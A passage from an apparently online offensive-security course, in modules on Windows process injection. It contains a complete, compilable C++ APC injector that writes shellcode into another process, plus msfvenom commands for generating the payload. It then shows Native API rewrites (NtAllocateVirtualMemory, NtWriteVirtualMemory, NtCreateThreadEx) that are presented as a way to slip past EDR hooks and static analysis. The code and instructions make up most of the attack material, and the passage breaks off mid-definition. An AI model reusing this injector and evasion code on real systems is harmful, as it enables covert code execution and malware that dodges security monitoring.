a command-line argument.</li>\n<li>Accept the shellcode (as a byte array) either compiled directly into the tool or loaded from a file (compiling in is simpler for the first pass).</li>\n<li>Use <code>OpenProcess</code> to get a handle to the target process with necessary permissions.</li>\n<li>Use <code>CreateToolhelp32Snapshot</code> and the <code>Thread32First</code>/<code>Thread32Next</code> loop to enumerate threads belonging to the target PID.</li>\n<li>Select <em>one</em> thread from the target process. For simplicity, picking the first thread found is often sufficient for basic testing, but be aware of the limitations mentioned above. Get a handle to this thread using <code>OpenThread</code>.</li>\n<li>Use <code>VirtualAllocEx</code> to allocate executable memory in the target process.</li>\n<li>Use <code>WriteProcessMemory</code> to write the shellcode into the allocated memory.</li>\n<li>Use <code>QueueUserAPC</code> to queue the execution of the shellcode address to the selected thread handle. Pass <code>NULL</code> for the <code>dwData</code> parameter unless your shellcode is designed to accept it.</li>\n<li>Include basic error checking for API calls (check return values for <code>NULL</code>, <code>FALSE</code>, etc.).</li>\n<li>Close all handles (<code>CloseHandle</code>).</li>\n</ol>\n<p><strong>Example Shellcode (for <code>calc.exe</code>):</strong></p>\n<p>You can generate simple shellcode using tools like Metasploit&#39;s <code>msfvenom</code> or various online generators. For Windows x64, a simple <code>calc.exe</code> payload might look something like this (this is just an example, the actual bytes will vary based on generation options):</p>\n<pre><code class=\"language-cpp\">unsigned char shellcode[] =\n    &quot;\\x50\\x51\\x52\\x53\\x56\\x57\\x55\\x6a\\x60\\x5a\\x6a\\x07\\x58\\x48\\x31\\xd2&quot;\n    &quot;\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xe2&quot;; // Example x64 calc.exe shellcode bytes\n</code></pre>\n<p><strong>Basic Code Structure (C++):</strong></p>\n<pre><code class=\"language-cpp\">#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;TlHelp32.h&gt; // Required for CreateToolhelp32Snapshot, Thread32First/Next\n\n// Example shellcode (replace with your actual shellcode bytes)\n// This is a placeholder, replace with your generated payload!\nunsigned char shellcode[] =\n    &quot;\\x90\\x90\\x90\\x90&quot; // NOPs\n    // ... put your shellcode bytes here ...\n    &quot;\\xC3&quot;; // RET (simple return instruction)\nsize_t shellcodeSize = sizeof(shellcode);\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        std::cerr &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;PID&gt;&quot; &lt;&lt; std::endl;\n        return 1;\n    }\n\n    DWORD pid = std::stoi(argv[1]);\n    HANDLE hProcess = NULL;\n    HANDLE hThread = NULL;\n    LPVOID remoteBuffer = NULL;\n    THREADENTRY32 te32;\n\n    // 1. Get a handle to the target process\n    // Request necessary permissions\n    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); // Using ALL_ACCESS for simplicity in lab\n    if (hProcess == NULL) {\n        std::cerr &lt;&lt; &quot;Error: Could not open process &quot; &lt;&lt; pid &lt;&lt; &quot;. GetLastError: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;\n        return 1;\n    }\n    std::cout &lt;&lt; &quot;Successfully opened process &quot; &lt;&lt; pid &lt;&lt; std::endl;\n\n    // 2. Find a suitable thread in the target process\n    te32.dwSize = sizeof(THREADENTRY32);\n    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n\n    if (hThreadSnap == INVALID_HANDLE_VALUE) {\n        std::cerr &lt;&lt; &quot;Error: CreateToolhelp32Snapshot failed. GetLastError: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    bool foundThread = false;\n    if (Thread32First(hThreadSnap, &amp;te32)) {\n        do {\n            if (te32.th32OwnerProcessID == pid) {\n                // Found a thread in the target process\n                // Open a handle to this thread\n                // Request necessary permissions for QueueUserAPC\n                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID); // Using ALL_ACCESS for simplicity\n                if (hThread != NULL) {\n                    std::cout &lt;&lt; &quot;Found and opened thread &quot; &lt;&lt; te32.th32ThreadID &lt;&lt; &quot; in process &quot; &lt;&lt; pid &lt;&lt; std::endl;\n                    foundThread = true;\n                    // For this example, we&#39;ll just use the first thread we find\n                    break;\n                } else {\n                     std::cerr &lt;&lt; &quot;Warning: Could not open thread &quot; &lt;&lt; te32.th32ThreadID &lt;&lt; &quot;. GetLastError: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;\n                }\n            }\n        } while (Thread32Next(hThreadSnap, &amp;te32));\n    }\n    CloseHandle(hThreadSnap);\n\n    if (!foundThread || hThread == NULL) {\n        std::cerr &lt;&lt; &quot;Error: Could not find or open any thread in process &quot; &lt;&lt; pid &lt;&lt; std::endl;\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    // 3. Allocate memory in the target process\n    remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (remoteBuffer == NULL) {\n        std::cerr &lt;&lt; &quot;Error: VirtualAllocEx failed. GetLastError: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;\n        CloseHandle(hThread);\n        CloseHandle(hProcess);\n        return 1;\n    }\n    std::cout &lt;&lt; &quot;Allocated &quot; &lt;&lt; shellcodeSize &lt;&lt; &quot; bytes at address &quot; &lt;&lt; remoteBuffer &lt;&lt; &quot; in target process.&quot; &lt;&lt; std::endl;\n\n    // 4. Write the shellcode into the allocated memory\n    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL)) {\n        std::cerr &lt;&lt; &quot;Error: WriteProcessMemory failed. GetLastError: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;\n        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);\n        CloseHandle(hThread);\n        CloseHandle(hProcess);\n        return 1;\n    }\n    std::cout &lt;&lt; &quot;Successfully wrote shellcode to remote process memory.&quot; &lt;&lt; std::endl;\n\n    // 5. Queue the APC to the target thread\n    // QueueUserAPC takes a pointer to the function to execute.\n    // Our shellcode is the function.\n    // We pass NULL for dwData as our example shellcode doesn&#39;t use it.\n    DWORD queueResult = QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, NULL);\n    if (queueResult == 0) { // QueueUserAPC returns non-zero on success\n         std::cerr &lt;&lt; &quot;Error: QueueUserAPC failed. GetLastError: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;\n         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);\n         CloseHandle(hThread);\n         CloseHandle(hProcess);\n         return 1;\n    }\n     std::cout &lt;&lt; &quot;Successfully queued APC to thread &quot; &lt;&lt; te32.th32ThreadID &lt;&lt; &quot;. Waiting for thread to enter alertable state...&quot; &lt;&lt; std::endl;\n\n    // Note: The shellcode will execute when the target thread\n    // enters an alertable state (e.g., calls SleepEx, WaitForSingleObjectEx, etc.).\n    // For testing, target a process like notepad.exe and just wait a moment.\n    // You might need to interact with the target application to trigger the state change.\n\n    // 7. Clean up\n    // We don&#39;t need to free the remote buffer immediately as the shellcode might still need it.\n    // A more sophisticated injector would handle this, but for a simple demo, we leave it.\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n\n    std::cout &lt;&lt; &quot;Injection process finished. Check the target process for shellcode execution.&quot; &lt;&lt; std::endl;\n\n    return 0;\n}\n</code></pre>\n<p><strong>How to Compile and Test:</strong></p>\n<ol>\n<li>Save the code as a <code>.cpp</code> file (e.g., <code>APCInjector.cpp</code>).</li>\n<li>Generate your actual shellcode byte array (e.g., using <code>msfvenom -p windows/x64/exec CMD=calc.exe -f c</code>). Replace the placeholder <code>shellcode</code> array in the C++ code with your generated bytes.</li>\n<li>Compile using Visual Studio (create a C++ console project and add the file) or g++:<pre><code class=\"language-bash\">g++ APCInjector.cpp -o APCInjector.exe -lkernel32\n</code></pre>\n</li>\n<li>Open a target application (like <code>notepad.exe</code>). Find its PID using Task Manager or <code>tasklist</code>.</li>\n<li>Run your compiled injector from a command prompt:<pre><code class=\"language-bash\">APCInjector.exe &lt;PID_of_notepad&gt;\n</code></pre>\n</li>\n<li>If successful, <code>calc.exe</code> should pop up after a short delay, demonstrating that your shellcode executed within the <code>notepad.exe</code> process via the APC mechanism.</li>\n</ol>\n<h3>Review and Next Steps</h3>\n<p>In this module, we dissected the Asynchronous Procedure Call mechanism, understood its dependency on the alertable state, and built a functional tool to inject and execute code using <code>QueueUserAPC</code>. We also discussed the primary detection vectors like API monitoring and memory scanning.</p>\n<p>While APC injection is more nuanced than <code>CreateRemoteThread</code>, it still relies on standard WinAPI calls (<code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>QueueUserAPC</code>). As we learned in Module 1, relying solely on these can increase our static and dynamic footprint.</p>\n<p>In <strong>Module 3</strong>, we will take a significant leap towards stealth by moving <em>below</em> the standard WinAPI layer and exploring the Native API (<code>ntdll.dll</code>) and potentially undocumented functions. This will allow us to perform operations like memory allocation and thread creation using functions that are less commonly hooked by security software, drawing inspiration from the low-level interaction concepts highlighted in resources like <code>zhasslan.txt</code>.</p>\n<p>Get your labs ready, experiment with your APC injector, try targeting different processes (and observe when the shellcode <em>doesn&#39;t</em> run if the thread isn&#39;t alertable!), and start thinking about how bypassing standard APIs could make your life harder as a defender trying to spot these actions.</p>\n<p>See you in Module 3 for the Native API deep dive!</p>\n\n                </div>\n             </div>\n         ",
    "module-3": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 3: module_3</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Okay team, let&#39;s buckle up and dive into Module 3. We&#39;ve seen how standard WinAPI calls work and their limitations in terms of stealth. Now, we&#39;re going to peel back another layer of the Windows onion and look at the Native API. This is where things get closer to the metal, offering more power and, potentially, more evasion opportunities.</p>\n<p>Remember that feeling in Module 2 when you realized <code>CreateRemoteThread</code> and <code>WriteProcessMemory</code> might be noisy? Good. That&#39;s the motivation for this module. We&#39;re moving <em>down</em> the stack.</p>\n<hr>\n<h2>Module 3: Deeper Access - Leveraging Native API and Undocumented Functions</h2>\n<p><strong>Module Objective:</strong> Understand the structure and purpose of the Native API (<code>ntdll.dll</code>) and learn techniques for finding and calling both documented and undocumented Native API functions for more stealthy operations.</p>\n<p><strong>Why is this crucial?</strong> Think like a defender. They set up hooks on common WinAPI functions (<code>CreateProcess</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code>, <code>VirtualAllocEx</code>, etc.). If your malicious code <em>only</em> calls these functions, it&#39;s relatively easy to spot. By going to the Native API, you&#39;re accessing the system at a lower level, potentially bypassing some user-mode hooks and making your activity look less like standard application behavior and more like, well, system-level operations. This can make detection harder.</p>\n<h3>3.1 The Relationship: WinAPI vs. Native API</h3>\n<p>Imagine Windows as a complex machine.</p>\n<ul>\n<li><strong>WinAPI (<code>kernel32.dll</code>, <code>user32.dll</code>, <code>advapi32.dll</code>, etc.)</strong> is like the polished dashboard and controls for the driver. It provides a stable, well-documented interface with high-level functions (<code>CreateFile</code>, <code>RegOpenKeyEx</code>, <code>MessageBox</code>). It&#39;s designed for application developers. These libraries reside in user-mode.</li>\n<li><strong>Native API (<code>ntdll.dll</code>)</strong> is like the engine control unit and direct hydraulic lines. It provides a lower-level interface to the Windows Executive and Kernel. Functions here often start with <code>Nt</code> or <code>Zw</code> (we&#39;ll explain the difference shortly). <code>ntdll.dll</code> is also in user-mode, but its functions act as direct gateways into the kernel via system calls.</li>\n</ul>\n<p><strong>Key point:</strong> Many WinAPI functions are essentially wrappers around Native API calls. For example, when you call <code>CreateFileA</code> from <code>kernel32.dll</code>, <code>CreateFileA</code> performs some argument validation and preparation <em>in user-mode</em>, and then makes a system call (via a function in <code>ntdll.dll</code> like <code>NtCreateFile</code>) to request the kernel to actually perform the file creation operation.</p>\n<p><strong>Visualizing the Stack:</strong></p>\n<pre><code>Your Application Code\n      |\n      v\nWinAPI (e.g., kernel32.dll)\n      | (Often makes internal calls to ntdll)\n      v\nNative API (ntdll.dll)\n      | (System Call / Syscall)\n      v\nWindows Executive / Kernel (ntoskrnl.exe)\n</code></pre>\n<h3>3.2 Why Bypass WinAPI and Call Native API Directly?</h3>\n<p>Okay, so if WinAPI just calls Native API anyway, why bother calling Native API directly?</p>\n<ol>\n<li><strong>Stealth (Avoiding User-Mode Hooks):</strong> Security software (like EDRs) often places user-mode hooks on common WinAPI functions in processes they monitor. When your code calls <code>WriteProcessMemory</code>, the EDR&#39;s hook gets triggered, logs the activity, and potentially blocks it. If you call <code>NtWriteVirtualMemory</code> directly, you bypass the hook placed on <code>WriteProcessMemory</code>. The call still goes through <code>ntdll.dll</code> and a system call, but the initial user-mode API wrapper hook is avoided.</li>\n<li><strong>Access to Lower-Level Functionality:</strong> The Native API exposes features and parameters that aren&#39;t always available or as granularly controlled through the WinAPI wrappers. <code>NtCreateThreadEx</code>, for instance, offers more control over thread creation attributes than the standard <code>CreateRemoteThread</code>.</li>\n<li><strong>Reducing Import Footprint (for later):</strong> While not fully realized until Module 6 (Dynamic Resolution), calling Native API directly means your compiled executable <em>might</em> not need to statically import functions like <code>VirtualAllocEx</code> or <code>WriteProcessMemory</code> from <code>kernel32.dll</code>. Instead, it might only need <code>LoadLibrary</code> and <code>GetProcAddress</code> (or their Native equivalents, or manual resolution) to find and call <code>ntdll.dll</code> functions. An executable with fewer or less common static imports looks less suspicious to simple static analysis tools.</li>\n</ol>\n<h3>3.3 Methods for Calling Native API Functions</h3>\n<p>Since you won&#39;t typically link directly against <code>ntdll.lib</code> (it&#39;s not a standard import library for applications), you need to resolve the addresses of the functions you want to call at runtime.</p>\n<p><strong>Method 1 (The Stepping Stone - Using <code>GetProcAddress</code>):</strong></p>\n<p>This is the simplest way to start, although it still relies on the standard <code>LoadLibrary</code> and <code>GetProcAddress</code> WinAPI calls (which you&#39;ll later want to replace with dynamic resolution from Module 6).</p>\n<p>The process:</p>\n<ol>\n<li>Load the <code>ntdll.dll</code> module into your process&#39;s address space (if it&#39;s not already there, which it almost always is).</li>\n<li>Get the address of the specific Native API function you want from <code>ntdll.dll</code> using <code>GetProcAddress</code>.</li>\n<li>Define a function pointer with the correct signature (return type, calling convention, parameters) for the Native API function.</li>\n<li>Cast the address obtained from <code>GetProcAddress</code> to this function pointer type.</li>\n<li>Call the function through the pointer.</li>\n</ol>\n<p><strong>Important:</strong> Native API functions typically use the <code>NTAPI</code> calling convention (which is <code>__stdcall</code>) and return an <code>NTSTATUS</code> value. <code>NTSTATUS</code> is a 32-bit value indicating success or failure, often checked using macros like <code>NT_SUCCESS()</code>.</p>\n<p>Let&#39;s see a basic example using <code>GetProcAddress</code> to get the address of <code>NtAllocateVirtualMemory</code>.</p>\n<pre><code class=\"language-cpp\">#include &lt;Windows.h&gt;\n#include &lt;winternl.h&gt; // For NTSTATUS and other types\n\n// We need to define the function pointer type for the Native API function\n// The signature must match exactly!\n// NTSTATUS NtAllocateVirtualMemory(\n//   HANDLE    ProcessHandle,\n//   PVOID*    BaseAddress,\n//   ULONG_PTR ZeroBits,\n//   PSIZE_T   RegionSize,\n//   ULONG     AllocationType,\n//   ULONG     Protect\n// );\ntypedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(\n    HANDLE    ProcessHandle,\n    PVOID*    BaseAddress,\n    ULONG_PTR ZeroBits,\n    PSIZE_T   RegionSize,\n    ULONG     AllocationType,\n    ULONG     Protect\n);\n\nint main() {\n    // 1. Load ntdll.dll (usually already loaded)\n    HMODULE hNtdll = GetModuleHandleA(&quot;ntdll.dll&quot;);\n    if (hNtdll == NULL) {\n        // Handle error\n        return 1;\n    }\n\n    // 2. Get the address of the function using GetProcAddress\n    PNtAllocateVirtualMemory pNtAllocateVirtualMemory =\n        (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);\n\n    if (pNtAllocateVirtualMemory == NULL) {\n        // Handle error\n        return 1;\n    }\n\n    printf(&quot;Successfully resolved NtAllocateVirtualMemory at: %p\\n&quot;, pNtAllocateVirtualMemory);\n\n    // --- Example usage (conceptual - requires a valid process handle) ---\n    HANDLE hProcess = GetCurrentProcess(); // Or OpenProcess(target_pid, ...)\n    PVOID baseAddress = NULL;\n    SIZE_T regionSize = 0x1000; // 4 KB\n    NTSTATUS status = pNtAllocateVirtualMemory(\n        hProcess,\n        &amp;baseAddress,\n        0, // ZeroBits\n        &amp;regionSize,\n        MEM_COMMIT | MEM_RESERVE,\n        PAGE_EXECUTE_READWRITE\n    );\n\n    if (NT_SUCCESS(status)) {\n        printf(&quot;Successfully allocated memory via NtAllocateVirtualMemory at: %p\\n&quot;, baseAddress);\n        // Now you would typically use NtWriteVirtualMemory and NtCreateThreadEx/NtQueueApcThread\n        // ...\n        // Don&#39;t forget to free the memory if needed (NtFreeVirtualMemory)\n        // status = NtFreeVirtualMemory(hProcess, &amp;baseAddress, &amp;regionSize, MEM_RELEASE);\n        // if (NT_SUCCESS(status)) { ... }\n    } else {\n        printf(&quot;Failed to allocate memory via NtAllocateVirtualMemory. Status: 0x%lX\\n&quot;, status);\n    }\n\n    // In a real injector, you&#39;d close the process handle\n    // CloseHandle(hProcess);\n\n    return 0;\n}\n</code></pre>\n<p><strong>Method 2 (Manual Function Pointer/Casting):</strong></p>\n<p>This is less a <em>different way to get the address</em> at this stage (we&#39;re still using <code>GetProcAddress</code> for simplicity), but rather a demonstration of how you&#39;ll <em>call</em> the function once you have its address, regardless of how you obtained it. It reinforces the idea of working with function pointers and casting. This becomes <em>essential</em> when you implement dynamic resolution by parsing the PE export table yourself in Module 6, as you won&#39;t be using <code>GetProcAddress</code> anymore.</p>\n<p>The structure is the same as above, focusing on the typedef and the cast:</p>\n<pre><code class=\"language-cpp\">// Define the function pointer type\ntypedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(\n    HANDLE    ProcessHandle,\n    PVOID*    BaseAddress,\n    ULONG_PTR ZeroBits,\n    PSIZE_T   RegionSize,\n    ULONG     AllocationType,\n    ULONG     Protect\n);\n\n// Get the address (using GetProcAddress for now, will be manual later)\nFARPROC pFuncAddress = GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);\n\n// Cast the address to the function pointer type\nPNtAllocateVirtualMemory pNtAllocateVirtualMemory = (PNtAllocateVirtualMemory)pFuncAddress;\n\n// Call the function through the pointer\nNTSTATUS status = pNtAllocateVirtualMemory(...);\n</code></pre>\n<p>This pattern ‚Äì define typedef, get address, cast, call ‚Äì is fundamental to working with Native API and will be used extensively.</p>\n<h3>3.4 Exploring <code>ntdll.dll</code>: Key Function Prefixes (<code>Nt</code>, <code>Zw</code>)</h3>\n<p><code>ntdll.dll</code> exports hundreds of functions. The most common prefixes you&#39;ll see are <code>Nt</code> and <code>Zw</code>.</p>\n<ul>\n<li><strong><code>Nt*</code>:</strong> These are the user-mode entry points to the majority of system services implemented in the Windows Executive (<code>ntoskrnl.exe</code>). When your user-mode code calls an <code>Nt*</code> function, it typically prepares the arguments and then executes a special instruction (like <code>syscall</code> on x64 or <code>sysenter</code>/<code>int 2E</code> on x86) to transition into kernel mode and execute the corresponding system service routine within <code>ntoskrnl.exe</code>.</li>\n<li><strong><code>Zw*</code>:</strong> These functions represent the <em>kernel-mode</em> entry points to the same system services. If kernel-mode code (like a driver) wants to call a system service, it uses the <code>Zw*</code> variant. For <em>user-mode</em> code, calling a <code>Zw*</code> function is generally equivalent to calling the corresponding <code>Nt*</code> function. The <code>ntdll.dll</code> stubs for <code>Zw*</code> functions simply jump to their <code>Nt*</code> counterparts. In offensive security, you&#39;ll primarily interact with the <code>Nt*</code> functions from user-mode.</li>\n</ul>\n<p><strong>How to explore <code>ntdll.dll</code> exports:</strong></p>\n<ol>\n<li><strong>Using <code>dumpbin</code>:</strong> A command-line tool included with Visual Studio.<pre><code class=\"language-bash\">dumpbin /exports C:\\Windows\\System32\\ntdll.dll\n</code></pre>\nThis will dump a list of all exported functions, including their ordinals and addresses (relative to the module base).</li>\n<li><strong>Using Sysinternals Process Explorer:</strong> View the properties of a running process. Go to the &quot;Modules&quot; tab, find <code>ntdll.dll</code>, double-click it, and go to the &quot;Exports&quot; tab. This provides a searchable list.</li>\n<li><strong>Using PE Analyzers:</strong> Tools like PE-Bear or CFF Explorer allow you to open <code>ntdll.dll</code> and browse its Export Directory Table visually.</li>\n<li><strong>Using Disassemblers/Debuggers:</strong> Load <code>ntdll.dll</code> into IDA Pro, Ghidra, or x64dbg. You can view the export list directly. You can also step into WinAPI calls to see which <code>ntdll.dll</code> function they call (e.g., set a breakpoint on <code>WriteProcessMemory</code> and step through it).</li>\n</ol>\n<h3>3.5 Finding Undocumented Functions</h3>\n<p>Alright, this is where it gets interesting and ties into the spirit of exploring like folks did in the days of <code>zhasslan.txt</code>. Not every useful function in <code>ntdll.dll</code> is fully documented on Microsoft Learn (MSDN). Some are internal helpers, some are remnants of older features, and some provide low-level access that isn&#39;t part of the public WinAPI contract.</p>\n<p><strong>What does &quot;undocumented&quot; mean here?</strong> It means Microsoft doesn&#39;t provide official documentation, guarantees about its stability across OS versions, or support for applications using it.</p>\n<p><strong>How to find them (and what <code>zhasslan.txt</code> represents):</strong></p>\n<p><code>zhasslan.txt</code> (and similar historical documents or modern research) embodies the methodology of deep Windows internal analysis. The goal wasn&#39;t just to use existing tools, but to understand the <em>mechanisms</em> by which Windows works at a low level.</p>\n<p>Methods employed (past and present):</p>\n<ol>\n<li><strong>Analyzing <code>ntdll.dll</code> Exports:</strong> Look for functions that don&#39;t have obvious WinAPI wrappers, have cryptic names, or appear related to core OS structures. Sometimes patterns emerge.</li>\n<li><strong>Tracing WinAPI Calls:</strong> Use a debugger or API monitor (like Process Monitor) to see the sequence of calls made by documented WinAPI functions. You&#39;ll often see them calling <code>Nt*</code> functions. This reveals the underlying Native API used for common operations.</li>\n<li><strong>Reverse Engineering <code>ntoskrnl.exe</code>:</strong> The actual kernel code. By analyzing how <code>ntoskrnl.exe</code> handles system calls (the <code>Nt*</code> functions), researchers can understand internal data structures and discover functions within the kernel that might be useful if called via a Native API entry point in <code>ntdll.dll</code>.</li>\n<li><strong>Analyzing Data Structures:</strong> Windows uses complex data structures (like the Executive Process Block - <code>EPROCESS</code>, Executive Thread Block - <code>ETHREAD</code>, Loader Data Table Entry - <code>LDR_DATA_TABLE_ENTRY</code>). Many undocumented <code>Nt*</code> functions operate on these structures. Understanding the structures themselves (often found by analyzing kernel code or crash dumps) helps interpret the purpose of functions that take pointers to them.</li>\n<li><strong>Reviewing Public Security Research:</strong> Many offensive and defensive researchers publish findings on undocumented APIs they&#39;ve discovered or used.</li>\n<li><strong>Fuzzing/Experimentation:</strong> Sometimes, the purpose of a function can be inferred by calling it with different parameters in a controlled environment and observing the results or side effects.</li>\n</ol>\n<p><strong>The <code>zhasslan.txt</code> connection:</strong> This specific document was influential because it detailed low-level Windows structures and APIs, including how to traverse things like the loaded module list (<code>LDR_DATA_TABLE_ENTRY</code>) directly from the Process Environment Block (PEB), bypassing standard WinAPI functions like <code>EnumProcessModules</code>. This kind of direct PEB/TEB access and manual structure traversal is a hallmark of advanced, stealthy techniques and is something we&#39;ll touch upon in Module 6 regarding finding module base addresses without standard APIs.</p>\n<p><strong>Crucial Caveat:</strong> Using undocumented functions is risky. They can change or be removed in future Windows versions, potentially breaking your code. They are also more likely to be monitored by advanced security solutions because they are not part of typical application behavior.</p>\n<h3>3.6 Practical Examples: Replacing WinAPI with Native API</h3>\n<p>Let&#39;s look at the Native API counterparts for the core injection operations we discussed in Module 2.</p>\n<p><strong>1. Allocating Memory:</strong></p>\n<ul>\n<li><strong>WinAPI:</strong> <code>VirtualAllocEx</code></li>\n<li><strong>Native API:</strong> <code>NtAllocateVirtualMemory</code></li>\n</ul>\n<p>As seen in the example above, <code>NtAllocateVirtualMemory</code> has a similar purpose but slightly different parameters and return type (<code>NTSTATUS</code>).</p>\n<pre><code class=\"language-cpp\">// Function pointer typedef (as defined earlier)\ntypedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(\n    HANDLE    ProcessHandle,\n    PVOID*    BaseAddress,\n    ULONG_PTR ZeroBits,\n    PSIZE_T   RegionSize,\n    ULONG     AllocationType,\n    ULONG     Protect\n);\n\n// ... in your code ...\nPNtAllocateVirtualMemory pNtAllocateVirtualMemory = // ... resolved address ...\n\nHANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, target_pid);\nif (hProcess == NULL) { /* error */ }\n\nPVOID remoteBuffer = NULL; // Will hold the allocated address\nSIZE_T bufferSize = shellcode_size; // Size of your shellcode\n\n// Call the Native API function\nNTSTATUS status = pNtAllocateVirtualMemory(\n    hProcess,\n    &amp;remoteBuffer, // Address of the pointer to receive the allocated address\n    0,             // ZeroBits - usually 0\n    &amp;bufferSize,   // Pointer to the size, can be adjusted by the kernel\n    MEM_COMMIT | MEM_RESERVE, // Allocation type flags\n    PAGE_EXECUTE_READWRITE // Protection flags\n);\n\nif (!NT_SUCCESS(status)) {\n    printf(&quot;[-] Failed to allocate memory via NtAllocateVirtualMemory. Status: 0x%lX\\n&quot;, status);\n    CloseHandle(hProcess);\n    return 1;\n}\n\nprintf(&quot;[+] Allocated %zu bytes at %p via NtAllocateVirtualMemory.\\n&quot;, bufferSize, remoteBuffer);\n\n// remoteBuffer now holds the address in the target process\n</code></pre>\n<p><strong>2. Writing Memory:</strong></p>\n<ul>\n<li><strong>WinAPI:</strong> <code>WriteProcessMemory</code></li>\n<li><strong>Native API:</strong> <code>NtWriteVirtualMemory</code></li>\n</ul>\n<p>Again, similar purpose, different signature and return type.</p>\n<pre><code class=\"language-cpp\">#include &lt;winternl.h&gt; // For NTSTATUS\n\n// Function pointer typedef\n// NTSTATUS NtWriteVirtualMemory(\n//   HANDLE    ProcessHandle,\n//   PVOID     BaseAddress,\n//   PVOID     Buffer,\n//   ULONG     BufferLength,\n//   PULONG    BytesWritten\n// );\ntypedef NTSTATUS (NTAPI *PNtWriteVirtualMemory)(\n    HANDLE    ProcessHandle,\n    PVOID     BaseAddress,\n    PVOID     Buffer,\n    ULONG     BufferLength,\n    PULONG    BytesWritten\n);\n\n// ... in your code after allocating memory ...\nPNtWriteVirtualMemory pNtWriteVirtualMemory = // ... resolved address ...\n\n// Assuming &#39;hProcess&#39; and &#39;remoteBuffer&#39; from the allocation step\n// Assuming &#39;shellcode&#39; is a byte array and &#39;shellcode_size&#39; is its size\n\nULONG bytesWritten = 0;\nstatus = pNtWriteVirtualMemory(\n    hProcess,\n    remoteBuffer,     // Base address in target process\n    (PVOID)shellcode, // Local buffer containing data to write\n    shellcode_size,   // Number of bytes to write\n    &amp;bytesWritten     // Optional: Pointer to receive number of bytes written\n);\n\nif (!NT_SUCCESS(status)) {\n     printf(&quot;[-] Failed to write memory via NtWriteVirtualMemory. Status: 0x%lX\\n&quot;, status);\n     // Clean up allocated memory if necessary\n     // SIZE_T freeSize = 0; // For MEM_RELEASE, size is ignored but needs to be 0\n     // NtFreeVirtualMemory(hProcess, &amp;remoteBuffer, &amp;freeSize, MEM_RELEASE);\n     CloseHandle(hProcess);\n     return 1;\n}\n\nprintf(&quot;[+] Wrote %lu bytes to %p via NtWriteVirtualMemory.\\n&quot;, bytesWritten, remoteBuffer);\n</code></pre>\n<p><strong>3. Creating/Executing Code (Thread Creation):</strong></p>\n<ul>\n<li><strong>WinAPI:</strong> <code>CreateRemoteThread</code>, <code>CreateRemoteThreadEx</code></li>\n<li><strong>Native API:</strong> <code>NtCreateThreadEx</code></li>\n</ul>\n<p><code>NtCreateThreadEx</code> is a more powerful, less documented (in terms of public usage examples) Native API function for creating threads. It allows finer control over thread attributes and creation flags. This is a common choice in advanced injection because it&#39;s not the standard <code>CreateRemoteThread</code> and offers more flexibility.</p>\n<pre><code class=\"language-cpp\">#include &lt;winternl.h&gt; // For NTSTATUS\n// You might need to define the THREAD_ATTRIBUTES structure if it&#39;s not in your headers\n// It can vary slightly by OS version/architecture, but typically looks something like this:\n/*\ntypedef struct _OBJECT_ATTRIBUTES {\n    ULONG Length;\n    HANDLE RootDirectory;\n    PUNICODE_STRING ObjectName;\n    ULONG Attributes;\n    PVOID SecurityDescriptor;\n    PVOID SecurityQualityOfService;\n} OBJECT_ATTRIBUTES;\ntypedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;\n\ntypedef struct _PS_ATTRIBUTE {\n    ULONG Attribute;\n    SIZE_T Size;\n    union {\n        ULONG Value;\n        PVOID ValuePtr;\n    } u1;\n    PSIZE_T ReturnLength;\n} PS_ATTRIBUTE, *PPS_ATTRIBUTE;\n\ntypedef struct _PS_ATTRIBUTE_LIST {\n    SIZE_T TotalLength;\n    PS_ATTRIBUTE Attributes[1];\n} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;\n\n// Define attribute numbers (these are often found via RE or unofficial docs)\n// #define PS_ATTRIBUTE_CLIENT_ID 1 // Example\n// #define PS_ATTRIBUTE_EXCEPTION_PORT 2 // Example\n// ... and so on ...\n*/\n// For simplicity in this example, we&#39;ll rely on winternl.h if available or assume basic attributes.\n// A full implementation might need manual structure definition and attribute number lookup.\n\n\n// Function pointer typedef\n// NTSTATUS NtCreateThreadEx(\n//   OUT PHANDLE hThread,\n//   IN ACCESS_MASK DesiredAccess,\n//   IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\n//   IN HANDLE ProcessHandle,\n//   IN PVOID lpStartAddress,\n//   IN PVOID lpParameter,\n//   IN ULONG Flags, // e.g., CREATE_SUSPENDED\n//   IN SIZE_T ZeroBits,\n//   